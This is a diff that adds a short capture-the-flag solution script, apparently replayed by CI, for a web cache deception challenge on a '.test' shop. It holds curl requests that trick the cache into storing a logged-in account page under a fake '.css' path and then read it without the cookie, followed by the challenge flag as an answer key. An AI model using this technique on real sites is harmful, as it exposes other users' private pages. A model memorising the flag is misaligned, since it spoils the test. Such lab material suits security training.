@@ -1,0 +1,6 @@
+# Challenge "The deceived cache": the shortest path, replayed by CI in every language.
+curl -i https://boutique.vitrine.test/compte
+curl -i -b "session=vt-temoin-01" https://boutique.vitrine.test/compte/x.css
+curl -i https://boutique.vitrine.test/compte/x.css
+submit FLAG{vitrine-cache-trompeur-4b8e}
+answer strict
